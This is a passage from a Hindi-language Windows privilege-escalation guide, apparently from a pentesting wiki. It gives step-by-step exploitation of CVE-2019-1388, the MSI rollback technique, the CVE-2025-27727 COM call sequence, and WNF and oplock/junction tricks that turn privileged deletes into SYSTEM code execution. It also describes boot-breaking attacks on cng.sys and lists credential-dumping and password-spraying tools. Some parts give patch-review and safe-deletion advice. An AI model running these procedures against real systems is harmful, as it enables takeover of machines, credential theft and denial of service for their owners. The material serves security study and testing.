  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Processes से passwords चुराना

## Low Priv User से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (console या RDP के ज़रिए) का access है और UAC enabled है, तो Microsoft Windows के कुछ versions में किसी unprivileged user से terminal या "NT\AUTHORITY SYSTEM" जैसे किसी अन्य process को run करना संभव है।

इससे एक ही vulnerability का इस्तेमाल करके privileges escalate करना और UAC bypass करना, दोनों संभव हो जाते हैं। इसके अलावा, कुछ भी install करने की ज़रूरत नहीं है और इस process के दौरान इस्तेमाल किया गया binary Microsoft द्वारा signed और जारी किया गया है।

कुछ प्रभावित systems ये हैं:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

इस vulnerability का exploit करने के लिए, निम्नलिखित steps पूरे करना आवश्यक है:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

आपके पास इस GitHub repository में सभी आवश्यक फ़ाइलें और जानकारी हैं:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium से High Integrity Level / UAC Bypass

**Integrity Levels** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses** के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root में Upload Directory Junctions

कोई application एक अनुमानित upload subdirectory बना सकता है, उसमें caller द्वारा दिया गया filename लिख सकता है और फिर फ़ाइल को process कर सकता है। यदि low-privilege user server-side write से पहले उस subdirectory को हटा सके और उसकी जगह NTFS junction रख सके, तो write junction के ज़रिए web-served directory में जा सकता है। वहाँ रखी गई script web-service identity के रूप में चल सकती है, यदि server उस file type को execute करता है। यह application-specific arbitrary-write boundary है; केवल writable upload directory या मौजूदा junction होना इसका प्रमाण नहीं है।

Upload handler में path construction और timing, subdirectory पर user के effective delete/create rights, destination के effective ACLs, writer reparse points को follow करता है या नहीं, और web server उस destination में files execute करता है या नहीं—इनकी जाँच करें। Writer और web server की process identities को अलग-अलग confirm करें। Passive inventory से directory ACLs और reparse metadata का पता चल सकता है, लेकिन इससे handler का व्यवहार या भविष्य में junction swap स्थापित नहीं होता। यदि execution service account के रूप में होता है, तो किसी अलग token-privilege path पर विचार करने से पहले **actual process token** की जाँच करें।

## WNF-triggered privileged scheduled-task cleanup

कोई scheduled task, जो manual execution को अस्वीकार करता है, फिर भी unprivileged trigger उजागर कर सकता है। किसी privileged task का audit करते समय उसका XML export करें और task DACL, principal और action के साथ **सभी** triggers की जाँच करें। विशेष रूप से, `WnfStateChangeTrigger` एक Windows Notification Facility (WNF) state का नाम बताता है; यदि वह securable state मौजूदा user को update publish करने की अनुमति देती है, तो user `<AllowStartOnDemand>false</AllowStartOnDemand>` के बावजूद configured identity के अंतर्गत task को indirectly start कर सकता है।<sup>[[43]](#references)</sup>

उदाहरण के लिए, Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task SYSTEM के रूप में चलता था, standard user से WNF state `7508BCA32C079E41` पर updates स्वीकार करता था, और Recall disabled होने पर भी `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` की जाँच करता था।<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

पहुंच की जांच करने के लिए, `ntdll.dll` से `ZwUpdateWnfStateData` resolve करें, आठ-बाइट state name के लिए एक खाली update सबमिट करें, और return status का मिलान task के last-run data या Procmon activity से करें। नीचे दिया गया reduced probe Recall task के उदाहरण में इस्तेमाल की गई byte sequence का उपयोग करता है; जांचे जा रहे task के लिए export किए गए bytes का उपयोग करें।<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Recursive cleanup को privileged deletion में बदलना

उपयोगी primitive केवल trigger नहीं, बल्कि attacker-controlled directory स्वीकार करने वाला privileged cleanup routine है। Enumeration से लेकर अंतिम बदलाव तक operation को trace करें: profile/session discovery, wildcard से चुने गए children, `SHCreateItemFromParsingName`, और `IFileOperation::DeleteItem` इस बात के मजबूत संकेत हैं कि पहले जाँचे गए pathname को बाद में recursively traverse किया जाएगा। यदि descendants को trusted directory handles के सापेक्ष open करके deletion से पहले validate नहीं किया जाता, तो attacker enumeration और उपयोग के बीच resolution बदल सकता है।<sup>[[43]](#references)</sup>

WNF trigger को नीचे बताए गए [oplock, junction और Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) के साथ pair करें: oplock, legitimate child चुनने के बाद cleaner को pause करता है, जबकि writable ancestor को replace कर दिया जाता है, ताकि privileged delete दोबारा शुरू होने पर `\RPC Control` के रास्ते protected target तक resolve हो। Recall chain में इससे SYSTEM के रूप में `C:\Config.Msi` delete हुआ, जो documented MSI rollback technique के लिए आवश्यक था।<sup>[[31]](#references)[[43]](#references)</sup>

### Nested descendants, shallow reparse-point fixes को bypass करते हैं

केवल attacker-controlled root और उसके immediate child को validate करने से recursive pathname-based delete सुरक्षित नहीं होता। उन checked objects को legitimate रखें और junction/oplock substitution को उनके नीचे एक अतिरिक्त child में ले जाएँ; `IFileOperation::DeleteItem` अंततः unvalidated descendant तक पहुँचता है और उसके नए target को follow करता है। CVE-2026-20941 इसी तरह के incomplete fix से बना था: पहले Recall patch ने `UKP` और GUID-जैसी directory को validate किया, लेकिन पुराना recursive deletion operation बनाए रखा।<sup>[[43]](#references)</sup>

सुरक्षित तरीका है कि **हर descendant** को पहले से trusted directory handle के सापेक्ष open करें, final resolved path/object प्राप्त करके verify करें, और deletion disposition उसी verified handle पर लागू करें। किसी prefix को validate करके फिर recursive path-based deletion पर वापस न जाएँ। Patch review के दौरान, वास्तविक call site पर structures भी जाँचें: इस मामले में `NtCreateFile` पर `OBJECT_ATTRIBUTES` के runtime inspection से non-null `RootDirectory` और relative `{GUID}\\secure_file.lock` name दिखा, जिससे decompiler के भ्रामक output का खंडन हुआ, जिसमें दूसरी `FILE_DELETE_ON_CLOSE` primitive का संकेत था।<sup>[[43]](#references)</sup>

## मनमाने Folder को Delete/Move/Rename करने से SYSTEM EoP तक

यह technique [**इस blog post में**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) बताई गई है; इसका exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)।<sup>[[31]](#references)[[32]](#references)</sup>

इस attack में मूल रूप से Windows Installer के rollback feature का दुरुपयोग करके uninstallation के दौरान legitimate files को malicious files से replace किया जाता है। इसके लिए attacker को एक **malicious MSI installer** बनाना होगा, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा। बाद में Windows Installer अन्य MSI packages को uninstall करते समय rollback files store करने के लिए इस folder का उपयोग करेगा; इन rollback files को malicious payload रखने के लिए संशोधित किया गया होगा।

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

एक low-privileged client, `CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) के ज़रिए SYSTEM `msiexec.exe` service तक पहुँच सकता है। Reverse engineering से संबंधित `IMsiServer` calls की पहचान vtable offset `0xA0` पर `MsiBeginTransactionW`, `0xC8` पर `SetEEUIDirectoryAndFilter`, और `0x50` पर `CleanupTempPackages` के रूप में हुई। ये names और offsets reverse-engineered हैं और अलग-अलग builds में बदल सकते हैं।<sup>[[41]](#references)</sup>

Non-administrator के लिए, `SetEEUIDirectoryAndFilter` caller द्वारा दिए गए path को `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, और `FILE_FLAG_OPEN_REPARSE_POINT` के साथ खोलते समय ही caller की impersonation करता है। इससे साबित होता है कि caller directory delete कर सकता है और reparse point को follow करने से बचा जा सकता है, लेकिन यह checked file object को बाद के cleanup से bind **नहीं** करता और न ही यह साबित करता है कि Windows Installer ने उसे बनाया था।<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` के बाद, `SetEEUIDirectoryAndFilter` caller के filter argument की परवाह किए बिना path को folder के रूप में schedule करता है। Service, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` के अंतर्गत एक named `REG_DWORD` value लिखती है: value name caller-controlled path होता है और data `0x00000002` folder flag होता है। इसके बाद `CleanupTempPackages(NULL, FALSE)` सीधे cleanup शुरू करता है। इसका elevated worker registry values enumerate करके folder entries को बिना path provenance जाँचे recursive `FDeleteFolder` में भेजता है। यदि सामान्य removal विफल हो जाए, तो code `LockdownPath` भी call करता है, file attributes clear करता है और फिर कोशिश करता है।<sup>[[41]](#references)</sup>

`msi.dll` से निकला न्यूनतम call sequence यह है:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

उपयोगी primitive junction redirect के बजाय path reuse है। हमलावर द्वारा बनाया गया `C:\Config.Msi` register करें, उसे हटाएँ, और Windows Installer को बाद में protected rollback data के साथ वही pathname दोबारा बनाने दें। Cleanup stale `TempPackages` नाम पर भरोसा करता है और नई directory को SYSTEM के रूप में delete कर देता है। इससे `FILE_FLAG_OPEN_REPARSE_POINT` और redirection-trust mitigation की intended boundary bypass हो जाती है, क्योंकि reparse point की ज़रूरत नहीं होती।<sup>[[41]](#references)</sup>

यह deletion primitive नीचे दी गई rollback chain में काम आता है: अलग `Installer\Folders` record को सुरक्षित रखें, protected `C:\Config.Msi` delete करें, उसे NULL DACL के साथ दोबारा बनाएँ, और installer द्वारा DACL harden करने से पहले `WRITE_DAC` की अनुमति वाला handle अपने पास रखें। पहले से खुला handle `NtSetSecurityObject` से permissive DACL बहाल कर सकता है, जिसके बाद rollback दोबारा शुरू होने से पहले बनाए गए `.rbs` को बदला जा सकता है।<sup>[[41]](#references)</sup>

Microsoft ने इस path को ठीक करने के लिए, नया feature gate enabled होने पर `CMsiTransaction::SetEEUIDirectoryAndFilter` को `ScheduleFileOrFolderDelete` call करने से रोक दिया। COM call फिर भी success लौटा सकती है, लेकिन अब यह attacker-controlled path को `TempPackages` में नहीं डालती। सफल method return को patch test मानने के बजाय April 2025 Windows security updates लागू करें।<sup>[[41]](#references)[[42]](#references)</sup>

संक्षेप में technique इस प्रकार है:

1. **Stage 1 – Hijack की तैयारी (`C:\Config.Msi` को खाली छोड़ें)**

- Step 1: MSI install करें
    - ऐसा `.msi` बनाएँ जो writable folder (`TARGETDIR`) में कोई harmless file (जैसे, `dummy.txt`) install करे।
    - Installer को **"UAC Compliant"** के रूप में mark करें, ताकि **non-admin user** इसे चला सके।
    - Install के बाद file पर एक **handle** खुला रखें।

- Step 2: Uninstall शुरू करें
    - वही `.msi` uninstall करें।
    - Uninstall process files को `C:\Config.Msi` में ले जाना और उनका नाम बदलकर `.rbf` files (rollback backups) रखना शुरू कर देता है।
    - File के open handle को `GetFinalPathNameByHandle` से **poll करें**, ताकि पता चले कि file कब `C:\Config.Msi\<random>.rbf` बनती है।

- Step 3: Custom Syncing
    - `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है, जो:
        - `.rbf` लिखे जाने पर signal देता है।
        - फिर uninstall जारी रखने से पहले किसी अन्य event का **wait** करता है।

- Step 4: `.rbf` की deletion रोकें
    - Signal मिलने पर, `.rbf` file को `FILE_SHARE_DELETE` के बिना **open करें** — इससे उसे **delete होने से रोका जाता है**।
    - फिर वापस signal दें, ताकि uninstall पूरा हो सके।
    - Windows Installer `.rbf` delete नहीं कर पाता, और क्योंकि वह सभी contents delete नहीं कर सकता, इसलिए **`C:\Config.Msi` हटाया नहीं जाता**।

- Step 5: `.rbf` को manually delete करें
    - आप (attacker) `.rbf` file को manually delete करें।
    - अब **`C:\Config.Msi` खाली है**, और hijack के लिए तैयार है।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability trigger करें**।

2. **Stage 2 – Rollback Scripts को malicious scripts से बदलना**

- Step 6: कमज़ोर ACLs के साथ `C:\Config.Msi` दोबारा बनाएँ
    - `C:\Config.Msi` folder खुद दोबारा बनाएँ।
    - **कमज़ोर DACLs** (जैसे, Everyone:F) set करें और `WRITE_DAC` के साथ एक **handle खुला रखें**।

- Step 7: एक और Install चलाएँ
    - `.msi` को दोबारा install करें, इसमें:
        - `TARGETDIR`: Writable location।
        - `ERROROUT`: ऐसा variable जो forced failure trigger करे।
    - इस install का उपयोग फिर से **rollback** trigger करने के लिए होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: `.rbs` के लिए monitor करें
    - `C:\Config.Msi` को monitor करने के लिए `ReadDirectoryChangesW` का उपयोग करें, जब तक कोई नया `.rbs` दिखाई न दे।
    - उसका filename capture करें।

- Step 9: Rollback से पहले sync करें
    - `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है, जो:
        - `.rbs` बनते ही एक event signal करता है।
        - फिर आगे बढ़ने से पहले **wait** करता है।

- Step 10: कमज़ोर ACL फिर से लागू करें
    - `.rbs created` event मिलने के बाद:
        - Windows Installer `C:\Config.Msi` पर **मज़बूत ACLs फिर से लागू करता है**।
        - लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` वाला handle है, आप **कमज़ोर ACLs फिर से लागू कर सकते हैं**।

> ACLs **केवल handle open करते समय लागू होते हैं**, इसलिए आप फिर भी folder में लिख सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` डालें
    - `.rbs` file को एक **fake rollback script** से overwrite करें, जो Windows को यह करने का निर्देश देती है:
        - आपकी `.rbf` file (malicious DLL) को किसी **privileged location** (जैसे, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore करे।
    - एक fake `.rbf` डालें, जिसमें **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback trigger करें
    - Sync event signal करें, ताकि installer फिर से शुरू हो।
    - एक **type 19 custom action (`ErrorOut`)** को एक तय बिंदु पर install को **जानबूझकर fail** करने के लिए configure किया गया है।
    - इससे **rollback शुरू होता है**।

- Step 13: SYSTEM आपका DLL install करता है
    - Windows Installer:
        - आपका malicious `.rbs` पढ़ता है।
        - आपके `.rbf` DLL को target location में copy करता है।
    - अब आपका **malicious DLL, SYSTEM द्वारा load किए जाने वाले path में है**।

- अंतिम चरण: SYSTEM code execute करें
    - कोई trusted **auto-elevated binary** (जैसे, `osk.exe`) चलाएँ, जो hijack किए गए DLL को load करे।
    - **धमाका**: आपका code **SYSTEM के रूप में execute होता है**।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback technique (पिछली वाली) यह मानती है कि आप **पूरा folder** (जैसे, `C:\Config.Msi`) delete कर सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो?

आप **NTFS internals** का exploitation कर सकते हैं: हर folder में एक hidden alternate data stream होती है, जिसका नाम है:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

यह stream फ़ोल्डर का **index metadata** संग्रहित करता है।

इसलिए, यदि आप किसी फ़ोल्डर की `::$INDEX_ALLOCATION` stream **delete** करते हैं, तो NTFS फ़ाइल सिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह मानक file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> भले ही आप *file* delete API को कॉल कर रहे हों, यह **खुद folder को delete कर देता है**।

### Folder Contents Delete से SYSTEM EoP तक
क्या होगा अगर आपका primitive आपको arbitrary files/folders delete करने की अनुमति नहीं देता, लेकिन **attacker-controlled folder के *contents* delete करने की अनुमति देता है**?

1. Step 1: एक bait folder और file सेटअप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है, तो oplock **execution को pause कर देता है**।

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. चरण 3: SYSTEM process ट्रिगर करें (जैसे, `SilentCleanup`)
- यह process folders (जैसे, `%TEMP%`) को scan करता है और उनकी contents delete करने की कोशिश करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock ट्रिगर होता है** और control आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर – deletion को redirect करें

- विकल्प A: `file1.txt` को कहीं और move करें
    - इससे oplock को तोड़े बिना `folder1` खाली हो जाता है।
    - `file1.txt` को सीधे delete न करें — इससे oplock समय से पहले release हो जाएगा।

- विकल्प B: `folder1` को **junction** में बदलें:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> यह उस NTFS internal stream को target करता है जो folder metadata store करता है — इसे delete करने से folder delete हो जाता है।

5. Step 5: Oplock release करें
- SYSTEM process जारी रहता है और `file1.txt` को delete करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में इसे delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा delete कर दिया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

ऐसे primitive का exploit करें जो आपको **SYSTEM/admin के रूप में कोई भी folder create करने देता है** — भले ही **आप files write न कर सकें** या **कमज़ोर permissions set न कर सकें**।

किसी **critical Windows driver** के नाम से एक **folder** (file नहीं) बनाएँ, जैसे:
```
C:\Windows\System32\cng.sys
```

- यह path सामान्यतः `cng.sys` kernel-mode driver से संबंधित होता है।
- अगर आप इसे **पहले से एक folder के रूप में बना देते हैं**, तो Windows boot के दौरान वास्तविक driver लोड नहीं कर पाता।
- इसके बाद, Windows boot के दौरान `cng.sys` लोड करने की कोशिश करता है।
- उसे folder दिखाई देता है, **वास्तविक driver का पता नहीं लगा पाता**, और **crash हो जाता है या boot रुक जाता है**।
- **कोई fallback नहीं है**, और बाहरी हस्तक्षेप (जैसे boot repair या disk access) के बिना **कोई recovery नहीं है**।

### privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS

जब कोई **privileged service**, **writable config** से पढ़े गए path पर logs/exports लिखती है, तो उस path को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **SeCreateSymbolicLinkPrivilege के बिना भी**)।<sup>[[15]](#references)</sup>

**आवश्यकताएँ**
- Target path रखने वाला config attacker के लिए writable हो (जैसे, `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point और OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।<sup>[[16]](#references)[[17]](#references)</sup>
- ऐसा privileged operation जो उस path पर लिखता हो (log, export, report)।

**उदाहरण की प्रक्रिया**
1. privileged log destination जानने के लिए config पढ़ें, जैसे `C:\ProgramData\ICONICS\IcoSetup64.ini` में `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`।
2. बिना admin के path redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component के log लिखने का इंतज़ार करें (जैसे, admin "send test SMS" ट्रिगर करता है)। अब write `C:\Windows\System32\cng.sys` में होगा।
4. Overwritten target का निरीक्षण करें (hex/PE parser) और corruption की पुष्टि करें; reboot करने पर Windows tampered driver path को load करेगा → **boot loop DoS**। यह तरीका किसी भी ऐसी protected file पर भी लागू होता है जिसे कोई privileged service write के लिए खोलती है।

> `cng.sys` आम तौर पर `C:\Windows\System32\drivers\cng.sys` से load होता है, लेकिन अगर उसकी एक copy `C:\Windows\System32\cng.sys` में मौजूद हो, तो Windows पहले उसे load करने की कोशिश कर सकता है। इससे corrupt data के लिए यह एक भरोसेमंद DoS sink बन जाता है।

## **High Integrity से System तक**

### **New service**

अगर आप पहले से ही High Integrity process में चल रहे हैं, तो **SYSTEM तक पहुँचने का रास्ता** आसान हो सकता है: बस एक नई service **बनाएँ और चलाएँ**।

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Service binary बनाते समय सुनिश्चित करें कि वह एक valid service हो या binary आवश्यक actions तेज़ी से करता हो, क्योंकि valid service न होने पर उसे 20s में terminate कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable** करने और एक _**.msi**_ wrapper का उपयोग करके reverse shell **install** करने की कोशिश कर सकते हैं।\
[इसमें शामिल registry keys और _.msi_ package install करने के तरीके के बारे में अधिक जानकारी यहाँ है।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**code यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### SeDebug + SeImpersonate से Full Token privileges तक

यदि आपके पास वे token privileges हैं (संभवतः आपको ये पहले से High Integrity process में मिलेंगी), तो SeDebug privilege के साथ आप **लगभग किसी भी process को खोल** सकते हैं (protected processes को छोड़कर), process का **token copy** कर सकते हैं, और उस token के साथ एक **arbitrary process बना** सकते हैं।\
इस technique में आम तौर पर **सभी token privileges वाले SYSTEM के रूप में चल रहे किसी process को चुना जाता है** (_हाँ, आपको ऐसे SYSTEM processes मिल सकते हैं जिनमें सभी token privileges नहीं होतीं_)।\
**इस प्रस्तावित technique को execute करने वाले code का** [**उदाहरण यहाँ मिल सकता है**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

इस technique का उपयोग meterpreter, `getsystem` में privilege escalation के लिए करता है। इसमें **एक pipe बनाना और फिर उस pipe पर लिखने के लिए service बनाना/abuse करना** शामिल है। इसके बाद, **`SeImpersonate`** privilege का उपयोग करके pipe बनाने वाला **server**, pipe client (service) के token को **impersonate** कर पाएगा और SYSTEM privileges प्राप्त कर सकेगा।\
यदि आप [**name pipes के बारे में और जानना चाहते हैं, तो इसे पढ़ें**](#named-pipe-client-impersonation)।\
यदि आप [**name pipes का उपयोग करके high integrity से System तक जाने का उदाहरण पढ़ना चाहते हैं, तो इसे पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **लोड** की जा रही **dll को hijack** कर पाते हैं, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह की privilege escalation के लिए भी उपयोगी है। इसके अलावा, **high integrity process से इसे करना कहीं आसान है**, क्योंकि उस process को dlls लोड करने के लिए इस्तेमाल होने वाले folders पर **write permissions** मिलेंगी।\
**आप** [**Dll hijacking के बारे में यहाँ और जान सकते हैं**](dll-hijacking/index.html)**।**

### **Administrator या Network Service से System तक**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE या NETWORK SERVICE से full privs तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच करें और जानकारी जुटाएँ (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla और RDP की saved session जानकारी निकालता है। local में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- जुटाए गए passwords को पूरे domain में spray करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights आवश्यक हैं)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजें (VisualStudio का उपयोग करके compile करना होगा) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host enumerate करता है (privesc tool की तुलना में जानकारी जुटाने वाला tool अधिक है) (compile करना होगा) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई software से credentials निकालता है (github पर precompiled exe उपलब्ध है)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# में port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration की जाँच करें (github पर executable precompiled उपलब्ध है)। अनुशंसित नहीं। यह Win10 में ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच करें (python से बना exe)। अनुशंसित नहीं। यह Win10 में ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस post के आधार पर बनाया गया tool (ठीक से काम करने के लिए इसे accesschk की आवश्यकता नहीं है, लेकिन यह उसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको .NET के सही version का उपयोग करके project compile करना होगा ([यह देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))। Victim host पर .NET का installed version देखने के लिए आप यह कर सकते हैं:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

